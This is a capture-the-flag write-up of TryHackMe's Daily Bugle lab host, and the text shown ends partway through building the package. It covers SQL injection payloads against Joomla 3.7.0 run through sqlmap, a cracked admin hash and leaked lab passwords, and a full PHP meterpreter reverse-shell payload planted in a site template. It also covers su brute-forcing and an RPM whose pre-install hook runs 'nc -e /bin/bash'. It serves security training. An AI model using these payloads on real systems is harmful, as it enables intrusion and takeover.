+++
title = 'Daily Bugle Boot2Root Write-Up'
date = '2020-11-27'
author = 'Nate Catelli'
summary = 'A boot2root writeup of the Daily Bugle host from TryHackMe.'
tags = ['ctf', 'boot2root', 'hacking', 'writeup', 'tryhackme']
draft = false
+++

## Introduction

The Daily Bugle challenge was exceptionally difficult compared to challenges that I've attempted in the past. It was incredibly easy to rabbithole down paths if I wasn't diligent both in thinking about how to collect information but in documenting the information that I had gathered. In this post, I'll talk through my experience in tackling this challenge and especially focus on the rabbitholes I fell victim to, however it may be difficult to fully capture the amount of time spent in these in writing.

## Environment

The attack takes place on a flat network consisting of the attack host, a freshly-booted Kali Linux livecd, and the target host. I was given hardly any information about the host other than that there would be two flags on the host, a user and root flag.

## Attack

Prior to starting initial recon, I opened up a metasploit console and connected it to the msfdb postgres backend to gather any information that I had found into a single point. I also had set up burp suite to run on port 8080 and configured the local CA in Firefox. Finally I installed gobuster and seclists in anticipation of any enumeration I might need to do. I'm looking forward to these being included with Kali though I really only uses them for personal preference reasons.

### Host enumeration

After this initial setup, I started with a SYN, OS and Version scan of the host to attempt to identify what this target host was.

```bash
msf5 > db_nmap -sS -sV -O 10.10.162.223
[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-28 01:45 UTC
[*] Nmap: Nmap scan report for ip-10-10-162.223.eu-west-1.compute.internal (10.10.162.223)
[*] Nmap: Host is up (0.00059s latency).
[*] Nmap: Not shown: 997 closed ports
[*] Nmap: PORT     STATE SERVICE VERSION
[*] Nmap: 22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)
[*] Nmap: 80/tcp   open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
[*] Nmap: 3306/tcp open  mysql   MariaDB (unauthorized)
[*] Nmap: MAC Address: 02:72:4F:1F:35:95 (Unknown)
[*] Nmap: Device type: general purpose
[*] Nmap: Running: Linux 3.X
[*] Nmap: OS CPE: cpe:/o:linux:linux_kernel:3
[*] Nmap: OS details: Linux 3.10 - 3.13
[*] Nmap: Network Distance: 1 hop
[*] Nmap: OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 16.23 seconds
```

This scan told me that the target looked to be a linux host, specifically running a 3.10-3.13 kernel. It also told me that, atleast initially, it would look like it was running a LAMP stack. I figured at this point it would be a good chance to do some happy path clicking around the site.

#### Visiting the Daily Bugle

I opened the site in my browser to what looked like a news-focused blog.

![daily index](/static/img/daily_bugle_http_index.png)

There wasn't any immediately links available to any sort of admin page, outside of a simple login panel on the homepage. Happy path clicking around the site also didn't yield any other information about potential users or even which CMS the site was using as far as I could identify. Without a hint of a username I didn't want to attempt any bruteforce.

Thus, I decided to enumerate directories on the site to see if I could find anything that would yield more information about what kinda site this was.

### Enumerating directories on the site

In order to run the directory enumeration, I reached for my favorite enumeration tool and directory wordlist.

```bash
root@kali:~# gobuster dir -u 'http://10.10.162.223' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.162.223
[+] Threads:        10
[+] Wordlist:       /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/11/27 21:01:06 Starting gobuster
===============================================================
/images (Status: 301)
/templates (Status: 301)
/media (Status: 301)
/modules (Status: 301)
/bin (Status: 301)
/plugins (Status: 301)
/includes (Status: 301)
/language (Status: 301)
/components (Status: 301)
/cache (Status: 301)
/libraries (Status: 301)
/tmp (Status: 301)
/layouts (Status: 301)
/administrator (Status: 301)
/cli (Status: 301)
===============================================================
2020/11/27 21:01:39 Finished
===============================================================
```

This returned a huge number of useful directories including an `/administrator` page that looked promising. Upon browsing to this page I found a standard admin login page.

![daily administrator page](/static/img/daily_bugle_http_administrator.png)

However, this atleast told me that I was investigating a Joomla site. Using the `auxiliary/scanner/http/joomla_version` module in metasploit I was able to also determine that this host was running version Joomla `3.7.0`.

```bash
msf5 auxiliary(scanner/http/joomla_version) > run

[*] Server: Apache/2.4.6 (CentOS) PHP/5.6.40
[+] Joomla version: 3.7.0
[*] Scanned 1 of 1 hosts (100% complete)
```

#### Looking for an vulnerability

With a version and CMS in mind I decided to feed the pair into searchsploit to see if anything turned up on exploit-db.

```bash
root@kali:~# searchsploit -w joomla | grep 3.7.0
Joomla! 3.7.0 - 'com_fields' SQL Injection    | https://www.exploit-db.com/exploits/42033
```

This yielded a single sql injection vulnerability that exploited a parameter in the com_fields component. Specifically, it identified that this component was vulnerable to an error-based injection as well as a time-based and boolean-based blind injection. Further information on the specific vulnerability can be found on the [sucuri blog](https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html).

### Mapping the database

I decided to try to map out the database to see if I could leak the admin credentials through one of these injection methods. To start, I ran a `sqlmap` command with the `TEB` techniques, representing each of the identified techniques in the vulnerability listing, and the `--dbs` flag to attempt to identify the joomla database. I've truncated some of the output to save space. It's worth noting that this run took quite a while as it was left intentionally broad to identify more information about the database.

```bash
msf5 auxiliary(scanner/http/joomla_version) > sqlmap -u "http://10.10.162.223/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -p 'list[fullordering]' --risk=3 --level=5 --random-agent --proxy http://127.0.0.1:8080 --technique=TEB --dbs
[*] exec: sqlmap -u "http://10.10.162.223/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -p 'list[fullordering]' --risk=3 --level=5 --random-agent --proxy http://127.0.0.1:8080 --technique=TEB --dbs
 ___ ___[.]_____ ___ ___  {1.4.8#stable}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:08:05 /2020-11-27/

[21:08:06] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.8) Gecko/2009040312 Gentoo Firefox/3.0.8' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[21:08:07] [INFO] testing connection to the target URL
[21:08:07] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
you have not declared cookie(s), while server wants to set its own ('eaa83fe8b963ab08ce9ab7d4a798de05=m0itckdsrg4...abd2rhmpp7'). Do you want to use those [Y/n] Y
[21:08:10] [INFO] checking if the target is protected by some kind of WAF/IPS
[21:08:10] [INFO] testing if the target URL content is stable
[21:08:10] [INFO] target URL content is stable
[21:08:11] [INFO] heuristic (basic) test shows that GET parameter 'list[fullordering]' might be injectable (possible DBMS: 'MySQL')
[21:08:11] [INFO] testing for SQL injection on GET parameter 'list[fullordering]'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[21:08:17] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[21:08:17] [WARNING] reflective value(s) found and filtering out
[21:08:29] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
...
[21:22:49] [INFO] testing 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)'
[21:23:02] [INFO] GET parameter 'list[fullordering]' appears to be 'MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)' injectable 
GET parameter 'list[fullordering]' is vulnerable. Do you want to keep testing the others (if any)? [y/N]
sqlmap identified the following injection point(s) with a total of 2299 HTTP(s) requests:
---
Parameter: list[fullordering] (GET)
    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 8098 FROM(SELECT COUNT(*),CONCAT(0x71786a6b71,(SELECT (ELT(8098=8098,1))),0x71706b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 9257 FROM (SELECT(SLEEP(5)))iXhJ)
---
[21:23:24] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[21:23:28] [INFO] fetching database names
[21:23:30] [INFO] retrieved: 'information_schema'
[21:23:31] [INFO] retrieved: 'joomla'
[21:23:32] [INFO] retrieved: 'mysql'
[21:23:33] [INFO] retrieved: 'performance_schema'
[21:23:34] [INFO] retrieved: 'test'
available databases [5]:
[*] information_schema
[*] joomla
[*] mysql
[*] performance_schema
[*] test

[21:23:34] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 2261 times
[21:23:34] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.162.223'

[*] ending @ 21:23:34 /2020-11-27/
```

This eventually identified valid injection techniques which could be used to further refine the `sqlmap` command. It also confirmed that the joomla database was in fact called `joomla`.

With this in mind, I was able to refine my `sqlmap` command to attempt to map the tables in the `joomla` database. Again, the output was truncated for space. While this identified many tables, I've included only a few of the most interesting.

```bash
msf5 auxiliary(scanner/http/joomla_version) > sqlmap -u "http://10.10.162.223/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -p 'l
ist[fullordering]' --risk=3 --level=5 --random-agent --proxy http://127.0.0.1:8080 --technique=TE --dbms=MySQL -D joomla --tables
[*] exec: sqlmap -u "http://10.10.162.223/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -p 'list[fullordering]' --risk=3 --level=
5 --random-agent --proxy http://127.0.0.1:8080 --technique=TE --dbms=MySQL -D joomla --tables

        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.4.8#stable}
|_ -| . [)]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 21:26:25 /2020-11-27/
[21:26:25] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; U; PPC Mac OS X; es) AppleWebKit/419 (KHTML, like Gecko) Safari/419.3' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
[21:26:25] [INFO] testing connection to the target URL
[21:26:25] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
you have not declared cookie(s), while server wants to set its own ('eaa83fe8b963ab08ce9ab7d4a798de05=u77g1e9e2sv...580b9vdo65'). Do you want to use those [Y/n] Y    
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: list[fullordering] (GET)                                                                                                                                   
    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 8098 FROM(SELECT COUNT(*),CONCAT(0x71786a6b71,(SELECT (ELT(8098=8098,1))),0x71706b6
271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 9257 FROM (SELECT(SLEEP(5)))iXhJ)
---
[21:26:28] [INFO] testing MySQL
[21:26:29] [INFO] confirming MySQL
[21:26:29] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[21:26:29] [INFO] fetching tables for database: 'joomla'
[21:26:29] [INFO] retrieved: '#__assets'
[21:26:29] [INFO] retrieved: '#__associations'
[21:26:30] [INFO] retrieved: '#__banner_clients'
[21:26:30] [INFO] retrieved: '#__banner_tracks'
...
| #__user_usergroup_map      |
| #__usergroups              |
| #__users                   |
| #__utf8_conversion         |
| #__viewlevels              |
+----------------------------+

[*] ending @ 21:26:37 /2020-11-27/
```

With a `#__users` table now identified, I decided to attempt to enumerate this table for a valid set of user credentials. But before doing that I needed to provide the columns of the table. Luckily, the schema for the `users` table for joomla `3.7.0` was readily available so I created a wordlist using the column names.

```bash
root@kali:~/ctf# cat table_schema.txt 
id
name
username
email
password
usertype
block
sendEmail
registerDate
lastvisitDate
activation
params
```

```bash
msf5 auxiliary(scanner/http/joomla_version) > sqlmap -u "http://10.10.162.223/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -p 'list[fullordering]' --risk=3 --level=5 --random-agent --proxy http://127.0.0.1:8080 --technique=TE --dbms=MySQL -D joomla -T '#__users' --dumpatexml" -p 'list[fullordering]' --risk=3 --level=5 --random-agent --proxy http://127.0.0.1:8080 --technique=TE --dbms=MySQL -D joomla -T '#__users' --dump
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.4.8#stable}
|_ -| . [)]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
[*] starting @ 21:34:53 /2020-11-27/

[21:34:53] [INFO] testing connection to the target URL
[21:34:54] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
you have not declared cookie(s), while server wants to set its own ('eaa83fe8b963ab08ce9ab7d4a798de05=n9efcr7j772...u0vd4k6dr5'). Do you want to use those [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: list[fullordering] (GET)
    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 8098 FROM(SELECT COUNT(*),CONCAT(0x71786a6b71,(SELECT (ELT(8098=8098,1))),0x71706b6271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)

    Type: time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 9257 FROM (SELECT(SLEEP(5)))iXhJ)
---
[21:34:56] [INFO] testing MySQL
[21:34:56] [INFO] confirming MySQL
[21:34:56] [INFO] the back-end DBMS is MySQL
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
[21:34:56] [INFO] fetching columns for table '#__users' in database 'joomla'
[21:34:56] [WARNING] unable to retrieve column names for table '#__users' in database 'joomla'
do you want to use common column existence check? [y/N/q]
[21:35:25] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
which common columns (wordlist) file do you want to use?
[1] default '/usr/share/sqlmap/data/txt/common-columns.txt' (press Enter)
[2] custom
> 2
what's the custom common columns file location?
> /root/ctf/table_schema.txt
[21:36:01] [INFO] checking column existence using items from '/root/ctf/table_schema.txt'
[21:36:01] [INFO] adding words used on web page to the check list
please enter number of threads? [Enter for 1 (current)] 4
[21:36:14] [INFO] starting 4 threads
[21:36:15] [INFO] retrieved: id
[21:36:15] [INFO] retrieved: name
[21:36:15] [INFO] retrieved: username
[21:36:15] [INFO] retrieved: email
[21:36:15] [INFO] retrieved: password
[21:36:15] [INFO] retrieved: block
[21:36:16] [INFO] retrieved: sendEmail
[21:36:16] [INFO] retrieved: registerDate
[21:36:16] [INFO] retrieved: lastvisitDate
[21:36:16] [INFO] retrieved: activation
[21:36:16] [INFO] retrieved: params
[21:36:23] [INFO] fetching entries for table '#__users' in database 'joomla'
[21:36:23] [INFO] retrieved: '0'
[21:36:23] [INFO] retrieved: '0'
[21:36:23] [INFO] retrieved: 'jonah@tryhackme.com'
[21:36:23] [INFO] retrieved: '811'
[21:36:23] [INFO] retrieved: '2019-12-15 23:58:06'
[21:36:23] [INFO] retrieved: 'Super User'
[21:36:23] [INFO] retrieved: ''
[21:36:24] [INFO] retrieved: '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm'
[21:36:24] [INFO] retrieved: '2019-12-14 20:43:49'
[21:36:24] [INFO] retrieved: '1'
[21:36:24] [INFO] retrieved: 'jonah'
Database: joomla
Table: #__users
[1 entry]
+-----+------------+-------+---------------------+---------+--------------------------------------------------------------+----------+-----------+------------+---------------------+---------------------+
| id  | name       | block | email               | params  | password                                                     | username | sendEmail | activation | registerDate        | lastvisitDate       |
+-----+------------+-------+---------------------+---------+--------------------------------------------------------------+----------+-----------+------------+---------------------+---------------------+
| 811 | Super User | 0     | jonah@tryhackme.com | <blank> | $2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm | jonah    | 1         | 0          | 2019-12-14 20:43:49 | 2019-12-15 23:58:06 |
+-----+------------+-------+---------------------+---------+--------------------------------------------------------------+----------+-----------+------------+---------------------+---------------------+

[21:36:24] [INFO] table 'joomla.`#__users`' dumped to CSV file '/root/.local/share/sqlmap/output/10.10.162.223/dump/joomla/#__users.csv'
[21:36:24] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 93 times
[21:36:24] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/10.10.162.223'

[*] ending @ 21:36:24 /2020-11-27/
```

This returned what looked like a valid set of hashed credentials. I decided to run the credentials through `john` using the rockyou wordlist to see if I could identify the user's password.

### Cracking the hash

I ran `john` with a parallelism of 2 due to my attack host's 2 vcpus and walked away to let this run. Eventually I was lucky to obtain a match.

```bash
root@kali:~/ctf# john joomla.john --wordlist=/usr/share/wordlists/rockyou.txt --fork=2
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Node numbers 1-2 of 2 (fork)
Press 'q' or Ctrl-C to abort, almost any other key for status
spiderman123     (jonah)
2 1g 0:00:11:10 DONE (2020-11-27 21:52) 0.001491g/s 34.91p/s 34.91c/s 34.91C/s stargatesg1..speciala
1 0g 0:00:12:00 DONE (2020-11-27 21:53) 0g/s 33.61p/s 33.61c/s 33.61C/s hotcake..honey04
Waiting for 1 child to terminate
Use the "--show" option to display all of the cracked passwords reliably
Session completeds
```

![daily bugle admin panel](/static/img/daily_bugle_http_admin_panel.png)

With these new-found credentials (`jonah:spiderman123`), I was able to get through to the admin panel. I imediately began clicking around to see if I could find a template or module that I could attempt to inject a shell into.

Additionally, prior to starting an attack, I decided to start a wordlist of the credentials I was finding. On my first attempt I neglected to maintain a wordlist, this seemed like a small omission at the time but I later found it to have caused me a ton of problems.

#### Starting a Wordlist

```bash
root@kali:~/ctf# mkdir wordlists
root@kali:~/ctf# echo 'spiderman123' > wordlists/dailybugle.txt
```

### Catching a shell

It wasn't long before I found a path to the template page that I could inject a php shell into and I generated a php payload using meterpreter.

```bash
root@kali:~/ctf# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.182.144 LPORT=4444
[-] No platform was selected, choosing Msf::Module::Platform::PHP from the payload
[-] No arch selected, selecting arch: php from the payload
No encoder specified, outputting raw payload
Payload size: 1114 bytes
/*<?php /**/ error_reporting(0); $ip = '10.10.182.144'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
```

![daily bugle shell injection](/static/img/daily_bugle_http_shell_in_template.png)

I then opened the index.php template, saved the original contents to a backup file and copied the shell into the now empty body of the template. Prior to saving and executing I staged up my listener to catch the incoming shell.

```bash
msf5 auxiliary(scanner/http/joomla_version) > use mexploit/multi/handler 
[*] Using configured payload generic/shell_reverse_tcp
msf5 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (generic/shell_reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  10.10.182.144    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf5 exploit(multi/handler) > set payload rephp/meterpreterprete/reverse_tcp
payload => php/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > run -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 10.10.182.144:4444
```

Additionally after starting a handler, I staged up the `shell_to_meterpreter` post-exploit module so that I could quickly migrate the process from a php worker to a longer lived process in case there was a timeout configured on the webserver.

```bash
msf5 exploit(multi/handler) > search shell_to_meterpreter

Matching Modules
================

   #  Name                                    Disclosure Date  Rank    Check  Description
   -  ----                                    ---------------  ----    -----  -----------
   0  post/multi/manage/shell_to_meterpreter                   normal  No     Shell to Meterpreter Upgrade


msf5 exploit(multi/handler) > use 0
msf5 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
   LHOST    10.10.182.144    no        IP of host that will receive the connection from the payload (Will try to auto detect).
   LPORT    4433             yes       Port for payload to connect to.
   SESSION                   yes       The session to run this module on.

msf5 post(multi/manage/shell_to_meterpreter) > set SESSION 1
SESSION => 1
```

I then saved the template and refreshed the index page which quickly resulted in a caught shell. Next I executed the post-exploit `shell_to_meterpreter` module.

```bash
msf5 post(multi/manage/shell_to_meterpreter) > 
[*] Sending stage (38288 bytes) to 10.10.162.223
[*] Meterpreter session 1 opened (10.10.182.144:4444 -> 10.10.162.223:36010) at 2020-11-27 22:16:22 +0000

msf5 post(multi/manage/shell_to_meterpreter) > run

[!] SESSION may not be compatible with this module.
[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.182.144:4433 
[*] Sending stage (980808 bytes) to 10.10.162.223
[*] Meterpreter session 2 opened (10.10.182.144:4433 -> 10.10.162.223:55960) at 2020-11-27 22:16:36 +0000
[*] Command stager progress: 100.00% (773/773 bytes)
[*] Post module execution completed
msf5 post(multi/manage/shell_to_meterpreter) > sessions 

Active sessions
===============

  Id  Name  Type                   Information                                                              Connection
  --  ----  ----                   -----------                                                              ----------
  1         meterpreter php/linux  apache (48) @ dailybugle                                                 10.10.182.144:4444 -> 10.10.162.223:36010 (10.10.162.223)
  2         meterpreter x86/linux  no-user @ dailybugle (uid=48, gid=48, euid=48, egid=48) @ 10.10.162.223  10.10.182.144:4433 -> 10.10.162.223:55960 (10.10.162.223)

msf5 post(multi/manage/shell_to_meterpreter) > sessions 

Active sessions
===============

  Id  Name  Type                   Information                                                              Connection
  --  ----  ----                   -----------                                                              ----------
  1         meterpreter php/linux  apache (48) @ dailybugle                                                 10.10.182.144:4444 -> 10.10.162.223:36010 (10.10.162.223)
  2         meterpreter x86/linux  no-user @ dailybugle (uid=48, gid=48, euid=48, egid=48) @ 10.10.162.223  10.10.182.144:4433 -> 10.10.162.223:55960 (10.10.162.223)

msf5 post(multi/manage/shell_to_meterpreter) > sessions -k 1
[*] Killing the following session(s): 1
[*] Killing session 1
[*] 10.10.162.223 - Meterpreter session 1 closed.
```

Once I had a stable shell established, I killed the original shell and quickly replaced the exploited template with its original contents before verifying that I was now able to see the original, unmodified index page.

![daily bugle restored index](/static/img/daily_bugle_http_replaced_landing_page.png)

### Local enumeration

With my new local shell, I reached for linPEAS to run a quick local enumeration of the host.

```bash
msf5 post(multi/manage/shell_to_meterpreter) > sessions 2
[*] Starting interaction with 2...

meterpreter > getpid 
Current pid: 4344
meterpreter > sysinfo 
Computer     : 10.10.162.223
OS           : CentOS 7.7.1908 (Linux 3.10.0-1062.el7.x86_64)
Architecture : x64
BuildTuple   : i486-linux-musl
Meterpreter  : x86/linux
meterpreter > cd /tmp
meterpreter > upload /root/Desktop/PEASS/linPEAS/linpeas.sh
[*] uploading  : /root/Desktop/PEASS/linPEAS/linpeas.sh -> linpeas.sh
[*] Uploaded -1.00 B of 217.36 KiB (-0.0%): /root/Desktop/PEASS/linPEAS/linpeas.sh -> linpeas.sh
[*] uploaded   : /root/Desktop/PEASS/linPEAS/linpeas.sh -> linpeas.sh
meterpreter > shell
Process 4353 created.
Channel 2 created.
./linpeas.sh > 10.10.162.223_enum.txt
which: no fping in (/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/system/bin:/system/sbin:/system/xbin)

meterpreter > download 10.10.162.223_enum.txt /root/ctf/
[*] Downloading: 10.10.162.223_enum.txt -> /root/ctf//10.10.162.223_enum.txt
[*] Downloaded 429.28 KiB of 429.28 KiB (100.0%): 10.10.162.223_enum.txt -> /root/ctf//10.10.162.223_enum.txt
[*] download   : 10.10.162.223_enum.txt -> /root/ctf//10.10.162.223_enum.txt
```

The enumeration yielded a few pieces of information that seemed useful: a username `jjameson` and a set of root credentials for mysql DB from the `/var/www/html/configuration.php` file.

```bash
[+] Users with console
jjameson:x:1000:1000:Jonah Jameson:/home/jjameson:/bin/bash
root:x:0:0:root:/root:/bin/bash
```

```bash
[+] Searching passwords in config PHP files
     public $password = 'nv5uz9r3ZEDzVjNu';
```

I added this set of credentials to my dailybugle wordlist and decided to investigate how I could move horizontally to the `jjameson` user.

It's worth noting, in my initial pass I had neglected to document the above password which lead to a significant rabbithole as I continuously enumerated the host looking for a point of escalation.

```bash
root@kali:~/ctf# echo 'nv5uz9r3ZEDzVjNu' >> ./wordlists/dailybugle.txt
```

### Horizontal local privilege escalation

Now that I had identified the `jjameson` user as a potential next target I decided to attempt to escalate locally using a small, but immensely useful, bash script from Carlos Polop that bruteforces `su`, [su-bruteforce](https://github.com/carlospolop/su-bruteforce). I generated a new wordlist by combining the dailybugle wordlist and rockyou and then transferred this over to the host over a local http webserver. While not shown, `suBF.sh` was transfered to the host over the meterpreter session.

```bash
root@kali:~/ctf# curl -sO https://raw.githubusercontent.com/carlospolop/su-bruteforce/master/suBF.sh
root@kali:~/ctf# cd wordlists/
root@kali:~/ctf/wordlists# cat dailybugle.txt /usr/share/wordlists/rockyou.txt > combined-wl.txt
root@kali:~/ctf/wordlists# head combined-wl.txt -n 10
spiderman123
nv5uz9r3ZEDzVjNu
123456
12345
123456789
password
iloveyou
princess
1234567
rockyou
root@kali:~/ctf/wordlists# python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.162.223 - - [27/Nov/2020 22:36:38] "GET /combined-wl.txt HTTP/1.1" 200 -
```

```bash
meterpreter > shell
Process 21812 created.
Channel 7 created.
curl -sO 'http://10.10.182.144/combined-wl.txt'
./suBF.sh -u jjameson -w combined-wl.txt -t 0.7 -s 0.007
  [+] Bruteforcing jjameson...
  You can login as jjameson using password: nv5uz9r3ZEDzVjNu
```

Executing `suBF` immediately returned a match for the root database credentials. I attempted to ssh from my attack host to the target using the `jjameson` user and was pleased to find a shell.

```bash
root@kali:~# ssh jjameson@10.10.162.223
The authenticity of host '10.10.162.223 (10.10.162.223)' can't be established.
ECDSA key fingerprint is SHA256:apAdD+3yApa9Kmt7Xum5WFyVFUHZm/dCR/uJyuuCi5g.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.162.223' (ECDSA) to the list of known hosts.
jjameson@10.10.162.223's password: 
Last login: Fri Nov 27 17:37:52 2020
[jjameson@dailybugle ~]$ ls
user.txt
```

Upon logging in, I immediately found the first flag at `/home/jjameson/user.txt`.

### Local enumeration again

Now that I had a new low-privilege user I decided to run through enumeration with `linPEAS` again to see if it would turn up anything more useful than the previous scan. I uploaded the script to the users home directory and re-executed it.

```bash
User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

Interestingly this showed that the user had sudo privileges to execute `yum` which appeared to give the user the ability to install or uninstall anything on the host.

### Exploiting yum for vertical escalation

With the ability to execute yum on the host as a privileged user, I tried to craft a hostile RPM that I could use to trigger a reverse shell. To do this I would first need to craft the hostile package.

#### Crafting a hostile RPM

Referencing [gtfobins](https://gtfobins.github.io/gtfobins/yum/) I crafted the RPM using [fpm](https://github.com/jordansissel/fpm). My plan of attack was to pack a netcat reverse shell into the `before-install` trigger of an empty package.

```bash
root@kali:~/ctf# EXPLOITDIR=$(mktemp -d)
root@kali:~/ctf# CMD='nc -e /bin/bash 10.10.182.144 4444'
root@kali:~/ctf# RPMNAME="exploited"
root@kali:~/ctf# echo $CMD > $EXPLOITDIR/beforeinstall.sh
root@kali:~/ctf# fpm -n $RPMNAME -s dir -t rpm -a all --before-install $EXPLOITDIR/beforeinstall.sh $EXPLOITDIR
Doing `require 'backports'` is deprecated and will not load any backport in the next major release.
Require just the needed backports instead, or 'backports/latest'.
